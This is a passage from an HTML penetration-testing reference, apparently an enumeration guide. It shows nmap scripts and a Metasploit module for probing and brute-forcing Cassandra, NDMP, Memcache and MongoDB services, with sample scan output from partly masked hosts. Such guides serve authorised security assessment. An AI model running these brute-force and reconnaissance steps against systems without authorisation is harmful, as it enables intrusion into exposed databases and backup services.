<h4>Cassandra-brute<a class="headerlink" href="#cassandra-brute" title="Permalink to this headline">¶</a></h4>
<p><a class="reference external" href="https://nmap.org/nsedoc/scripts/cassandra-brute.html">cassandra-brute</a> which performs brute force password auditing against the Cassandra database.</p>
<p>Sample Output:</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">nmap</span> <span class="o">-</span><span class="n">p</span> <span class="mi">9160</span> <span class="mf">122.166</span><span class="o">.</span><span class="n">xx</span><span class="o">.</span><span class="n">xx</span> <span class="o">-</span><span class="n">n</span> <span class="o">--</span><span class="n">script</span><span class="o">=</span><span class="n">cassandra</span><span class="o">-</span><span class="n">brute</span>

<span class="n">Starting</span> <span class="n">Nmap</span> <span class="mf">7.01</span> <span class="p">(</span> <span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">nmap</span><span class="o">.</span><span class="n">org</span> <span class="p">)</span> <span class="n">at</span> <span class="mi">2016</span><span class="o">-</span><span class="mi">03</span><span class="o">-</span><span class="mi">27</span> <span class="mi">21</span><span class="p">:</span><span class="mi">19</span> <span class="n">IST</span>
<span class="n">Nmap</span> <span class="n">scan</span> <span class="n">report</span> <span class="k">for</span> <span class="mf">122.166</span><span class="o">.</span><span class="n">xx</span><span class="o">.</span><span class="n">xx</span>
<span class="n">Host</span> <span class="ow">is</span> <span class="n">up</span> <span class="p">(</span><span class="mf">0.083</span><span class="n">s</span> <span class="n">latency</span><span class="p">)</span><span class="o">.</span>
<span class="n">PORT</span>     <span class="n">STATE</span> <span class="n">SERVICE</span>
<span class="mi">9160</span><span class="o">/</span><span class="n">tcp</span> <span class="nb">open</span>  <span class="n">apani1</span>
<span class="o">|</span><span class="n">_cassandra</span><span class="o">-</span><span class="n">brute</span><span class="p">:</span> <span class="n">Any</span> <span class="n">username</span> <span class="ow">and</span> <span class="n">password</span> <span class="n">would</span> <span class="n">do</span><span class="p">,</span> <span class="s1">&#39;default&#39;</span> <span class="n">was</span> <span class="n">used</span> <span class="n">to</span> <span class="n">test</span>
</pre></div>
</div>
</div>
</div>
</div>
<div class="section" id="network-data-management-protocol-ndmp-port-10000">
<h2>Network Data Management Protocol (ndmp) - Port 10000<a class="headerlink" href="#network-data-management-protocol-ndmp-port-10000" title="Permalink to this headline">¶</a></h2>
<div class="section" id="id65">
<h3>Nmap<a class="headerlink" href="#id65" title="Permalink to this headline">¶</a></h3>
<div class="section" id="ndmp-fs-info">
<h4>ndmp-fs-info<a class="headerlink" href="#ndmp-fs-info" title="Permalink to this headline">¶</a></h4>
<p><a class="reference external" href="https://nmap.org/nsedoc/scripts/ndmp-fs-info.html">ndmp-fs-info.nse</a> can be used to list remote file systems</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">services</span> <span class="o">-</span><span class="n">s</span> <span class="n">ndmp</span> <span class="o">-</span><span class="n">p</span> <span class="mi">10000</span>
<span class="n">services</span> <span class="o">-</span><span class="n">p</span> <span class="mi">10000</span> <span class="o">-</span><span class="n">s</span> <span class="n">ndmp</span> <span class="o">-</span><span class="n">o</span> <span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="n">ndmp</span><span class="o">.</span><span class="n">ports</span>
<span class="n">cat</span> <span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="n">ndmp</span><span class="o">.</span><span class="n">ports</span> <span class="o">|</span> <span class="n">cut</span> <span class="o">-</span><span class="n">d</span> <span class="p">,</span> <span class="o">-</span><span class="n">f1</span> <span class="o">|</span> <span class="n">tr</span> <span class="o">-</span><span class="n">d</span> \<span class="s2">&quot; | grep -v host &gt; /tmp/ndmp.ports.2</span>
</pre></div>
</div>
<p>Pass this to nmap</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">nmap</span> <span class="o">-</span><span class="n">p</span> <span class="mi">10000</span> <span class="o">--</span><span class="n">script</span> <span class="n">ndmp</span><span class="o">-</span><span class="n">fs</span><span class="o">-</span><span class="n">info</span> <span class="o">-</span><span class="n">n</span> <span class="o">-</span><span class="n">iL</span> <span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="n">ndmp</span><span class="o">.</span><span class="n">ports</span><span class="o">.</span><span class="mi">2</span>
</pre></div>
</div>
<p>Sample Output:</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="o">|</span> <span class="n">ndmp</span><span class="o">-</span><span class="n">fs</span><span class="o">-</span><span class="n">info</span><span class="p">:</span>
<span class="o">|</span> <span class="n">FS</span>       <span class="n">Logical</span> <span class="n">device</span>             <span class="n">Physical</span> <span class="n">device</span>
<span class="o">|</span> <span class="n">NTFS</span>     <span class="n">C</span><span class="p">:</span>                         <span class="n">Device0000</span>
<span class="o">|</span> <span class="n">NTFS</span>     <span class="n">D</span><span class="p">:</span>                         <span class="n">Device0000</span>
<span class="o">|</span> <span class="n">NTFS</span>     <span class="n">E</span><span class="p">:</span>                         <span class="n">Device0000</span>
<span class="o">|</span> <span class="n">RMAN</span>     <span class="n">Oracle</span><span class="o">-</span><span class="n">Win</span><span class="p">::</span>\\<span class="n">TRDPLM</span>\<span class="n">WIND</span>  <span class="n">Device0000</span>
<span class="o">|</span> <span class="n">UNKNOWN</span>  <span class="n">Shadow</span> <span class="n">Copy</span> <span class="n">Components</span>     <span class="n">Device0000</span>
<span class="o">|</span><span class="n">_UNKNOWN</span>  <span class="n">System</span> <span class="n">State</span>               <span class="n">Device0000</span>
</pre></div>
</div>
</div>
<div class="section" id="ndmp-version">
<h4>ndmp-version<a class="headerlink" href="#ndmp-version" title="Permalink to this headline">¶</a></h4>
<p><a class="reference external" href="https://nmap.org/nsedoc/scripts/ndmp-version.html">ndmp-version</a> : Retrieves version information from the remote Network Data Management Protocol (ndmp) service. NDMP is a protocol intended to transport data between a NAS device and the backup device, removing the need for the data to pass through the backup server. This nse although is not outputing the version correctly, however if we switch to &#8211;script-trace we do find the versions</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="mi">00000010</span><span class="p">:</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">01</span> <span class="mi">08</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">02</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span>
<span class="mi">00000020</span><span class="p">:</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">17</span> <span class="mi">56</span> <span class="mi">45</span> <span class="mi">52</span> <span class="mi">49</span> <span class="mi">54</span> <span class="mi">41</span> <span class="mi">53</span> <span class="mi">20</span> <span class="mi">53</span> <span class="mi">6</span><span class="n">f</span> <span class="mi">66</span> <span class="mi">74</span>     <span class="n">VERITAS</span> <span class="n">Soft</span>
<span class="mi">00000030</span><span class="p">:</span> <span class="mi">77</span> <span class="mi">61</span> <span class="mi">72</span> <span class="mi">65</span> <span class="mi">2</span><span class="n">c</span> <span class="mi">20</span> <span class="mi">43</span> <span class="mi">6</span><span class="n">f</span> <span class="mi">72</span> <span class="mi">70</span> <span class="mi">2</span><span class="n">e</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">13</span> <span class="n">ware</span><span class="p">,</span> <span class="n">Corp</span><span class="o">.</span>
<span class="mi">00000040</span><span class="p">:</span> <span class="mi">52</span> <span class="mi">65</span> <span class="mi">6</span><span class="n">d</span> <span class="mi">6</span><span class="n">f</span> <span class="mi">74</span> <span class="mi">65</span> <span class="mi">20</span> <span class="mi">41</span> <span class="mi">67</span> <span class="mi">65</span> <span class="mi">6</span><span class="n">e</span> <span class="mi">74</span> <span class="mi">20</span> <span class="mi">66</span> <span class="mi">6</span><span class="n">f</span> <span class="mi">72</span> <span class="n">Remote</span> <span class="n">Agent</span> <span class="k">for</span>
<span class="mi">00000050</span><span class="p">:</span> <span class="mi">20</span> <span class="mi">4</span><span class="n">e</span> <span class="mi">54</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">03</span> <span class="mi">36</span> <span class="mi">2</span><span class="n">e</span> <span class="mi">33</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">03</span>  <span class="n">NT</span>     <span class="mf">6.3</span>
<span class="mi">00000060</span><span class="p">:</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="n">be</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">05</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">04</span>

<span class="n">NSOCK</span> <span class="n">INFO</span> <span class="p">[</span><span class="mf">5.0650</span><span class="n">s</span><span class="p">]</span> <span class="n">nsock_trace_handler_callback</span><span class="p">():</span> <span class="n">Callback</span><span class="p">:</span> <span class="n">READ</span> <span class="n">SUCCESS</span> <span class="k">for</span> <span class="n">EID</span> <span class="mi">1122</span> <span class="p">[</span><span class="mf">10.10</span><span class="o">.</span><span class="n">xx</span><span class="o">.</span><span class="n">xx</span><span class="p">:</span><span class="mi">10000</span><span class="p">]</span> <span class="p">(</span><span class="mi">108</span> <span class="nb">bytes</span><span class="p">)</span>
<span class="n">NSE</span><span class="p">:</span> <span class="n">TCP</span> <span class="mf">10.10</span><span class="o">.</span><span class="n">xx</span><span class="o">.</span><span class="n">xx</span><span class="p">:</span><span class="mi">40435</span> <span class="o">&lt;</span> <span class="mf">10.10</span><span class="o">.</span><span class="mf">9.12</span><span class="p">:</span><span class="mi">10000</span> <span class="o">|</span> <span class="mi">00000000</span><span class="p">:</span> <span class="mi">80</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">68</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">03</span> <span class="mi">56</span> <span class="n">f1</span> <span class="mi">64</span> <span class="n">e7</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">01</span>    <span class="n">h</span>    <span class="n">V</span> <span class="n">d</span>
<span class="mi">00000010</span><span class="p">:</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">01</span> <span class="mi">08</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">02</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span>
<span class="mi">00000020</span><span class="p">:</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">17</span> <span class="mi">56</span> <span class="mi">45</span> <span class="mi">52</span> <span class="mi">49</span> <span class="mi">54</span> <span class="mi">41</span> <span class="mi">53</span> <span class="mi">20</span> <span class="mi">53</span> <span class="mi">6</span><span class="n">f</span> <span class="mi">66</span> <span class="mi">74</span>     <span class="n">VERITAS</span> <span class="n">Soft</span>
<span class="mi">00000030</span><span class="p">:</span> <span class="mi">77</span> <span class="mi">61</span> <span class="mi">72</span> <span class="mi">65</span> <span class="mi">2</span><span class="n">c</span> <span class="mi">20</span> <span class="mi">43</span> <span class="mi">6</span><span class="n">f</span> <span class="mi">72</span> <span class="mi">70</span> <span class="mi">2</span><span class="n">e</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">13</span> <span class="n">ware</span><span class="p">,</span> <span class="n">Corp</span><span class="o">.</span>
<span class="mi">00000040</span><span class="p">:</span> <span class="mi">52</span> <span class="mi">65</span> <span class="mi">6</span><span class="n">d</span> <span class="mi">6</span><span class="n">f</span> <span class="mi">74</span> <span class="mi">65</span> <span class="mi">20</span> <span class="mi">41</span> <span class="mi">67</span> <span class="mi">65</span> <span class="mi">6</span><span class="n">e</span> <span class="mi">74</span> <span class="mi">20</span> <span class="mi">66</span> <span class="mi">6</span><span class="n">f</span> <span class="mi">72</span> <span class="n">Remote</span> <span class="n">Agent</span> <span class="k">for</span>
<span class="mi">00000050</span><span class="p">:</span> <span class="mi">20</span> <span class="mi">4</span><span class="n">e</span> <span class="mi">54</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">03</span> <span class="mi">36</span> <span class="mi">2</span><span class="n">e</span> <span class="mi">33</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">03</span>  <span class="n">NT</span>     <span class="mf">6.3</span>
</pre></div>
</div>
</div>
</div>
</div>
<div class="section" id="memcache-port-11211">
<h2>Memcache - Port 11211<a class="headerlink" href="#memcache-port-11211" title="Permalink to this headline">¶</a></h2>
<p>Memcached is a free &amp; open source, high-performance, distributed memory object caching system.</p>
<div class="section" id="id67">
<h3>Nmap<a class="headerlink" href="#id67" title="Permalink to this headline">¶</a></h3>
<div class="section" id="memcached-info">
<h4>memcached-info<a class="headerlink" href="#memcached-info" title="Permalink to this headline">¶</a></h4>
<p><a class="reference external" href="https://nmap.org/nsedoc/scripts/memcached-info.html">memcached-info</a> : Retrieves information (including system architecture, process ID, and server time) from distributed memory object caching system memcached.</p>
<p>Sample Output:</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">nmap</span> <span class="o">-</span><span class="n">p</span> <span class="mi">11211</span> <span class="o">--</span><span class="n">script</span> <span class="n">memcached</span><span class="o">-</span><span class="n">info</span> <span class="mf">10.10</span><span class="o">.</span><span class="n">xx</span><span class="o">.</span><span class="n">xx</span>

<span class="n">Starting</span> <span class="n">Nmap</span> <span class="mf">7.01</span> <span class="p">(</span> <span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">nmap</span><span class="o">.</span><span class="n">org</span> <span class="p">)</span> <span class="n">at</span> <span class="mi">2016</span><span class="o">-</span><span class="mi">03</span><span class="o">-</span><span class="mi">27</span> <span class="mi">02</span><span class="p">:</span><span class="mi">48</span> <span class="n">IST</span>
<span class="n">Nmap</span> <span class="n">scan</span> <span class="n">report</span> <span class="k">for</span> <span class="n">email</span><span class="o">.</span><span class="n">xxxxxx</span><span class="o">.</span><span class="n">com</span> <span class="p">(</span><span class="mf">10.10</span><span class="o">.</span><span class="n">xx</span><span class="o">.</span><span class="n">xx</span><span class="p">)</span>
<span class="n">Host</span> <span class="ow">is</span> <span class="n">up</span> <span class="p">(</span><span class="mf">0.082</span><span class="n">s</span> <span class="n">latency</span><span class="p">)</span><span class="o">.</span>
<span class="n">PORT</span>      <span class="n">STATE</span> <span class="n">SERVICE</span>
<span class="mi">11211</span><span class="o">/</span><span class="n">tcp</span> <span class="nb">open</span>  <span class="n">unknown</span>
<span class="o">|</span> <span class="n">memcached</span><span class="o">-</span><span class="n">info</span><span class="p">:</span>
<span class="o">|</span>   <span class="n">Process</span> <span class="n">ID</span>           <span class="mi">4252</span>
<span class="o">|</span>   <span class="n">Uptime</span>               <span class="mi">1582276</span> <span class="n">seconds</span>
<span class="o">|</span>   <span class="n">Server</span> <span class="n">time</span>          <span class="mi">2016</span><span class="o">-</span><span class="mi">03</span><span class="o">-</span><span class="mi">26</span><span class="n">T21</span><span class="p">:</span><span class="mi">18</span><span class="p">:</span><span class="mi">15</span>
<span class="o">|</span>   <span class="n">Architecture</span>         <span class="mi">64</span> <span class="n">bit</span>
<span class="o">|</span>   <span class="n">Used</span> <span class="n">CPU</span> <span class="p">(</span><span class="n">user</span><span class="p">)</span>      <span class="mf">25.881617</span>
<span class="o">|</span>   <span class="n">Used</span> <span class="n">CPU</span> <span class="p">(</span><span class="n">system</span><span class="p">)</span>    <span class="mf">17.413088</span>
<span class="o">|</span>   <span class="n">Current</span> <span class="n">connections</span>  <span class="mi">14</span>
<span class="o">|</span>   <span class="n">Total</span> <span class="n">connections</span>    <span class="mi">41</span>
<span class="o">|</span>   <span class="n">Maximum</span> <span class="n">connections</span>  <span class="mi">1024</span>
<span class="o">|</span>   <span class="n">TCP</span> <span class="n">Port</span>             <span class="mi">11211</span>
<span class="o">|</span>   <span class="n">UDP</span> <span class="n">Port</span>             <span class="mi">11211</span>
<span class="o">|</span><span class="n">_</span>  <span class="n">Authentication</span>       <span class="n">no</span>

<span class="n">Nmap</span> <span class="n">done</span><span class="p">:</span> <span class="mi">1</span> <span class="n">IP</span> <span class="n">address</span> <span class="p">(</span><span class="mi">1</span> <span class="n">host</span> <span class="n">up</span><span class="p">)</span> <span class="n">scanned</span> <span class="ow">in</span> <span class="mf">1.13</span> <span class="n">seconds</span>
</pre></div>
</div>
</div>
<div class="section" id="id69">
<h4>Other<a class="headerlink" href="#id69" title="Permalink to this headline">¶</a></h4>
<p>We can also telnet to this port: Stats is one of the commands</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">telnet</span> <span class="mf">10.10</span><span class="o">.</span><span class="n">xx</span><span class="o">.</span><span class="n">xx</span> <span class="mi">11211</span>
<span class="n">stats</span>
<span class="n">STAT</span> <span class="n">pid</span> <span class="mi">4252</span>
<span class="n">STAT</span> <span class="n">uptime</span> <span class="mi">1582386</span>
<span class="n">STAT</span> <span class="n">time</span> <span class="mi">1459027205</span>
<span class="n">STAT</span> <span class="n">version</span> <span class="mf">1.4</span><span class="o">.</span><span class="mi">10</span>
<span class="n">STAT</span> <span class="n">libevent</span> <span class="mf">2.0</span><span class="o">.</span><span class="mi">16</span><span class="o">-</span><span class="n">stable</span>
<span class="n">STAT</span> <span class="n">pointer_size</span> <span class="mi">64</span>
<span class="n">STAT</span> <span class="n">rusage_user</span> <span class="mf">25.889618</span>
<span class="n">STAT</span> <span class="n">rusage_system</span> <span class="mf">17.417088</span>
<span class="n">STAT</span> <span class="n">curr_connections</span> <span class="mi">14</span>
<span class="n">STAT</span> <span class="n">total_connections</span> <span class="mi">42</span>
<span class="n">STAT</span> <span class="n">connection_structures</span> <span class="mi">15</span>
<span class="n">STAT</span> <span class="n">reserved_fds</span> <span class="mi">20</span>
<span class="n">STAT</span> <span class="n">cmd_get</span> <span class="mi">3</span>
<span class="n">STAT</span> <span class="n">cmd_set</span> <span class="mi">3</span>
<span class="n">STAT</span> <span class="n">cmd_flush</span> <span class="mi">0</span>
<span class="n">STAT</span> <span class="n">cmd_touch</span> <span class="mi">0</span>
<span class="n">STAT</span> <span class="n">get_hits</span> <span class="mi">2</span>
<span class="n">STAT</span> <span class="n">get_misses</span> <span class="mi">1</span>
<span class="n">STAT</span> <span class="n">delete_misses</span> <span class="mi">0</span>
<span class="n">STAT</span> <span class="n">delete_hits</span> <span class="mi">0</span>
<span class="n">STAT</span> <span class="n">incr_misses</span> <span class="mi">0</span>
<span class="n">STAT</span> <span class="n">incr_hits</span> <span class="mi">0</span>
<span class="n">STAT</span> <span class="n">decr_misses</span> <span class="mi">0</span>
<span class="n">STAT</span> <span class="n">decr_hits</span> <span class="mi">0</span>
<span class="n">STAT</span> <span class="n">cas_misses</span> <span class="mi">0</span>
<span class="n">STAT</span> <span class="n">cas_hits</span> <span class="mi">0</span>
<span class="n">STAT</span> <span class="n">cas_badval</span> <span class="mi">0</span>
<span class="n">STAT</span> <span class="n">touch_hits</span> <span class="mi">0</span>
<span class="n">STAT</span> <span class="n">touch_misses</span> <span class="mi">0</span>
<span class="n">STAT</span> <span class="n">auth_cmds</span> <span class="mi">0</span>
<span class="n">STAT</span> <span class="n">auth_errors</span> <span class="mi">0</span>
<span class="n">STAT</span> <span class="n">bytes_read</span> <span class="mi">775</span>
<span class="n">STAT</span> <span class="n">bytes_written</span> <span class="mi">26158</span>
<span class="n">STAT</span> <span class="n">limit_maxbytes</span> <span class="mi">67108864</span>
<span class="n">STAT</span> <span class="n">accepting_conns</span> <span class="mi">1</span>
<span class="n">STAT</span> <span class="n">listen_disabled_num</span> <span class="mi">0</span>
<span class="n">STAT</span> <span class="n">threads</span> <span class="mi">4</span>
<span class="n">STAT</span> <span class="n">conn_yields</span> <span class="mi">0</span>
<span class="n">STAT</span> <span class="n">hash_power_level</span> <span class="mi">16</span>
<span class="n">STAT</span> <span class="n">hash_bytes</span> <span class="mi">524288</span>
<span class="n">STAT</span> <span class="n">hash_is_expanding</span> <span class="mi">0</span>
<span class="n">STAT</span> <span class="n">expired_unfetched</span> <span class="mi">0</span>
<span class="n">STAT</span> <span class="n">evicted_unfetched</span> <span class="mi">0</span>
<span class="n">STAT</span> <span class="nb">bytes</span> <span class="mi">87</span>
<span class="n">STAT</span> <span class="n">curr_items</span> <span class="mi">1</span>
<span class="n">STAT</span> <span class="n">total_items</span> <span class="mi">1</span>
<span class="n">STAT</span> <span class="n">evictions</span> <span class="mi">0</span>
<span class="n">STAT</span> <span class="n">reclaimed</span> <span class="mi">0</span>
<span class="n">END</span>
</pre></div>
</div>
<p>Sensepost has written a tool <a class="reference external" href="https://github.com/sensepost/go-derper">go-derper</a> and a article here <a class="reference external" href="https://www.sensepost.com/blog/2010/blackhat-write-up-go-derper-and-mining-memcaches/">blackhat-write-up-go-derper-and-mining-memcaches</a> Blackhat slides <a class="reference external" href="https://media.blackhat.com/bh-ad-10/Sensepost/BlackHat-AD-2010-Slaviero-Lifting-the-Fog-slides.pdf">here</a></p>
</div>
</div>
</div>
<div class="section" id="mongodb-port-27017-and-port-27018">
<h2>MongoDB - Port 27017 and Port 27018<a class="headerlink" href="#mongodb-port-27017-and-port-27018" title="Permalink to this headline">¶</a></h2>
<p><a class="reference external" href="https://github.com/all3g/exploit-exercises/tree/master/mongodb">mongodb</a> provides a good walkthru how to check for vulns in mongodb;</p>
<div class="section" id="id70">
<h3>Metasploit<a class="headerlink" href="#id70" title="Permalink to this headline">¶</a></h3>
<div class="section" id="mongodb-login-utility">
<h4>MongoDB Login Utility<a class="headerlink" href="#mongodb-login-utility" title="Permalink to this headline">¶</a></h4>
<p>Module attempts to brute force authentication credentials for MongoDB. Note that, by default, MongoDB does not require authentication. This can be used to check if there is no-authentication on the MongoDB by setting blank_passwords to true. This can also be checked using the Nmap nse mongodb-brute</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">use</span> <span class="n">auxiliary</span><span class="o">/</span><span class="n">scanner</span><span class="o">/</span><span class="n">mongodb</span><span class="o">/</span><span class="n">mongodb_login</span>
</pre></div>
</div>
<p>Sample Output:</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Scanning</span> <span class="n">IP</span><span class="p">:</span> <span class="mf">10.169</span><span class="o">.</span><span class="n">xx</span><span class="o">.</span><span class="n">xx</span>
<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">Mongo</span> <span class="n">server</span> <span class="mf">10.169</span><span class="o">.</span><span class="n">xx</span><span class="o">.</span><span class="n">xx</span> <span class="n">dosn</span><span class="s1">&#39;t use authentication</span>
</pre></div>
</div>
</div>
</div>
<div class="section" id="id71">
<h3>Nmap<a class="headerlink" href="#id71" title="Permalink to this headline">¶</a></h3>
<p>Nmap has three NSEs for mongo db databases</p>
<div class="section" id="mongodb-info">
<h4>Mongodb-info<a class="headerlink" href="#mongodb-info" title="Permalink to this headline">¶</a></h4>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">nmap</span> <span class="mf">10.169</span><span class="o">.</span><span class="n">xx</span><span class="o">.</span><span class="n">xx</span> <span class="o">-</span><span class="n">p</span> <span class="mi">27017</span> <span class="o">-</span><span class="n">sV</span> <span class="o">--</span><span class="n">script</span> <span class="n">mongodb</span><span class="o">-</span><span class="n">info</span>

<span class="n">Starting</span> <span class="n">Nmap</span> <span class="mf">7.01</span> <span class="p">(</span> <span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">nmap</span><span class="o">.</span><span class="n">org</span> <span class="p">)</span> <span class="n">at</span> <span class="mi">2016</span><span class="o">-</span><span class="mi">03</span><span class="o">-</span><span class="mi">26</span> <span class="mi">02</span><span class="p">:</span><span class="mi">23</span> <span class="n">IST</span>
<span class="n">Nmap</span> <span class="n">scan</span> <span class="n">report</span> <span class="k">for</span> <span class="n">mongod</span><span class="o">.</span><span class="n">example</span><span class="o">.</span><span class="n">com</span> <span class="p">(</span><span class="mf">10.169</span><span class="o">.</span><span class="n">xx</span><span class="o">.</span><span class="n">xx</span><span class="p">)</span>
<span class="n">Host</span> <span class="ow">is</span> <span class="n">up</span> <span class="p">(</span><span class="mf">0.088</span><span class="n">s</span> <span class="n">latency</span><span class="p">)</span><span class="o">.</span>
<span class="n">PORT</span>      <span class="n">STATE</span> <span class="n">SERVICE</span> <span class="n">VERSION</span>
<span class="mi">27017</span><span class="o">/</span><span class="n">tcp</span> <span class="nb">open</span>  <span class="n">mongodb</span> <span class="n">MongoDB</span> <span class="mf">2.6</span><span class="o">.</span><span class="mi">9</span> <span class="mf">2.6</span><span class="o">.</span><span class="mi">9</span>
<span class="o">|</span> <span class="n">mongodb</span><span class="o">-</span><span class="n">info</span><span class="p">:</span>
<span class="o">|</span>   <span class="n">MongoDB</span> <span class="n">Build</span> <span class="n">info</span>
<span class="o">|</span>     <span class="n">OpenSSLVersion</span> <span class="o">=</span>
<span class="o">|</span>     <span class="n">compilerFlags</span> <span class="o">=</span> <span class="o">-</span><span class="n">Wnon</span><span class="o">-</span><span class="n">virtual</span><span class="o">-</span><span class="n">dtor</span> <span class="o">-</span><span class="n">Woverloaded</span><span class="o">-</span><span class="n">virtual</span> <span class="o">-</span><span class="n">fPIC</span> <span class="o">-</span><span class="n">fno</span><span class="o">-</span><span class="n">strict</span><span class="o">-</span><span class="n">aliasing</span> <span class="o">-</span><span class="n">ggdb</span> <span class="o">-</span><span class="n">pthread</span> <span class="o">-</span><span class="n">Wall</span> <span class="o">-</span><span class="n">Wsign</span><span class="o">-</span><span class="n">compare</span> <span class="o">-</span><span class="n">Wno</span><span class="o">-</span><span class="n">unknown</span><span class="o">-</span><span class="n">pragmas</span> <span class="o">-</span><span class="n">Winvalid</span><span class="o">-</span><span class="n">pch</span> <span class="o">-</span><span class="n">pipe</span> <span class="o">-</span><span class="n">Werror</span> <span class="o">-</span><span class="n">O3</span> <span class="o">-</span><span class="n">Wno</span><span class="o">-</span><span class="n">unused</span><span class="o">-</span><span class="n">function</span> <span class="o">-</span><span class="n">Wno</span><span class="o">-</span><span class="n">deprecated</span><span class="o">-</span><span class="n">declarations</span> <span class="o">-</span><span class="n">fno</span><span class="o">-</span><span class="n">builtin</span><span class="o">-</span><span class="n">memcmp</span>
<span class="o">|</span>     <span class="n">loaderFlags</span> <span class="o">=</span> <span class="o">-</span><span class="n">fPIC</span> <span class="o">-</span><span class="n">pthread</span> <span class="o">-</span><span class="n">Wl</span><span class="p">,</span><span class="o">-</span><span class="n">z</span><span class="p">,</span><span class="n">now</span> <span class="o">-</span><span class="n">rdynamic</span>
<span class="o">|</span>     <span class="n">version</span> <span class="o">=</span> <span class="mf">2.6</span><span class="o">.</span><span class="mi">9</span>
<span class="o">|</span>     <span class="n">ok</span> <span class="o">=</span> <span class="mi">1</span>
<span class="o">|</span>     <span class="n">maxBsonObjectSize</span> <span class="o">=</span> <span class="mi">16777216</span>
<span class="o">|</span>     <span class="n">debug</span> <span class="o">=</span> <span class="n">false</span>
<span class="o">|</span>     <span class="n">bits</span> <span class="o">=</span> <span class="mi">64</span>
<span class="o">|</span>     <span class="n">javascriptEngine</span> <span class="o">=</span> <span class="n">V8</span>
<span class="o">|</span>     <span class="n">sysInfo</span> <span class="o">=</span> <span class="n">Linux</span> <span class="n">build20</span><span class="o">.</span><span class="n">mongod</span><span class="o">.</span><span class="n">example</span><span class="o">.</span><span class="n">com</span> <span class="mf">2.6</span><span class="o">.</span><span class="mi">32</span><span class="o">-</span><span class="mf">431.3</span><span class="o">.</span><span class="mf">1.</span><span class="n">el6</span><span class="o">.</span><span class="n">x86_64</span> <span class="c1">#1 SMP Fri Jan 3 21:39:27 UTC 2014 x86_64 BOOST_LIB_VERSION=1_49</span>
<span class="o">|</span>     <span class="n">versionArray</span>
<span class="o">|</span>       <span class="mi">1</span> <span class="o">=</span> <span class="mi">6</span>
<span class="o">|</span>       <span class="mi">2</span> <span class="o">=</span> <span class="mi">9</span>
<span class="o">|</span>       <span class="mi">3</span> <span class="o">=</span> <span class="mi">0</span>
<span class="o">|</span>       <span class="mi">0</span> <span class="o">=</span> <span class="mi">2</span>
<span class="o">|</span>     <span class="n">allocator</span> <span class="o">=</span> <span class="n">tcmalloc</span>
<span class="o">|</span>     <span class="n">gitVersion</span> <span class="o">=</span> <span class="n">df313bc75aa94d192330cb92756fc486ea604e64</span>
<span class="o">|</span>   <span class="n">Server</span> <span class="n">status</span>
<span class="o">|</span>     <span class="n">opcounters</span>
<span class="o">|</span>       <span class="n">query</span> <span class="o">=</span> <span class="mi">19752</span>
<span class="o">|</span>       <span class="n">update</span> <span class="o">=</span> <span class="mi">1374</span>
<span class="o">|</span>       <span class="n">insert</span> <span class="o">=</span> <span class="mi">71735056</span>
<span class="o">|</span>       <span class="n">command</span> <span class="o">=</span> <span class="mi">78465013</span>
<span class="o">|</span>       <span class="n">delete</span> <span class="o">=</span> <span class="mi">121</span>
<span class="o">|</span>       <span class="n">getmore</span> <span class="o">=</span> <span class="mi">4156</span>
<span class="o">|</span>       <span class="n">connections</span>
<span class="o">|</span>         <span class="n">available</span> <span class="o">=</span> <span class="mi">795</span>
<span class="o">|</span>       <span class="n">totalCreated</span> <span class="o">=</span> <span class="mi">4487</span>
<span class="o">|</span>       <span class="n">current</span> <span class="o">=</span> <span class="mi">24</span>
<span class="o">|</span>     <span class="n">uptimeMillis</span> <span class="o">=</span> <span class="mi">3487298933</span>
<span class="o">|</span>     <span class="n">localTime</span> <span class="o">=</span> <span class="mi">1458938079849</span>
<span class="o">|</span>     <span class="n">metrics</span>
<span class="o">|</span>       <span class="n">getLastError</span>
